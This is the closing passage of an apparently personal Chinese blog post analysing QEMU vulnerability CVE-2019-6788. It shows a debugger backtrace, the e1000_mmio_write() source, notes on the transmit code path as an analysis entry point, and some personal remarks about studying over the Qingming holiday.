</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#36 0x00005555558467ea in qemu_tcg_cpu_thread_fn (arg=0x555556844420) at /home/wnagzihxa1n/CVE-2019-6788/qemu/cpus.c:1733
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#37 0x0000555555d7a1a2 in qemu_thread_start (args=0x555556866840) at /home/wnagzihxa1n/CVE-2019-6788/qemu/util/qemu-thread-posix.c:498
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#38 0x00007ffff6ac46ba in start_thread (arg=0x7fffd5480700) at pthread_create.c:333
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#39 0x00007ffff67fa41d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
</div></div></div></pre>
<p>这个函数对应着<code>write()</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>static void
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>e1000_mmio_write(void *opaque, hwaddr addr, uint64_t val,
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span> unsigned size)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>{
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    E1000State *s = opaque;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    unsigned int index = (addr &amp; 0x1ffff) &gt;&gt; 2;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    if (index &lt; NWRITEOPS &amp;&amp; macreg_writeops[index]) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    if (!(mac_reg_access[index] &amp; MAC_ACCESS_FLAG_NEEDED)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    || (s-&gt;compat_flags &amp; (mac_reg_access[index] &gt;&gt; 2))) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    if (mac_reg_access[index] &amp; MAC_ACCESS_PARTIAL) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    DBGOUT(GENERAL, "Writing to register at offset: 0x%08x. "
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>   "It is not fully implemented.\n", index&lt;&lt;2);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    macreg_writeops[index](s, index, val);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    } else {    /* "flag needed" bit is set, but the flag is not active */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    DBGOUT(MMIO, "MMIO write attempt to disabled reg. addr=0x%08x\n",
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>   index&lt;&lt;2);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    } else if (index &lt; NREADOPS &amp;&amp; macreg_readops[index]) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    DBGOUT(MMIO, "e1000_mmio_writel RO %x: 0x%04"PRIx64"\n",
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>   index&lt;&lt;2, val);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    } else {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    DBGOUT(UNKNOWN, "MMIO unknown write addr=0x%08x,val=0x%08"PRIx64"\n",
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>   index&lt;&lt;2, val);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>函数<code>e1000_mmio_write()</code>会调用<code>set_tctl()</code>，这里不是直接调用，而是通过数组转换的形式</p>
<p>我个人的理解从函数<code>start_xmit()</code>开始可以算作是我们分析的入口，找到了入口，而且参数数据我们可控，就可以进行初步的代码阅读工作了，函数<code>pci_dma_read()</code>用于获取我们传入的数据，保存在<code>desc</code>描述符里，函数<code>process_tx_desc()</code>用于发送数据</p>
<p><img src="resources/D0924E2715C8F0696C9C3784DAE4F297.jpg" alt="IMAGE" width="773" height="787"></p>
<p>我真怕自己变成大佬口中的这种人</p>
<p><img src="resources/75D5E758AB6EC06BBEB02FC9EA2D3CB7.jpg" alt="IMAGE" width="589" height="196"></p>
<p>下周开始找朱老师把ROOT给整了，一直拖拖拖，趁还没被优化赶紧薅一波技术大佬的羊毛，这两天继续搞搞分析，手上还有一大堆东西没学，把虫老板的逆向2重新翻了翻，又学到了很多，害，我还是太菜了</p>
<p>明天开始就是清明节了，岛上见:)</p>
</div></div>
      <script></script>
    </body>
    </html>
  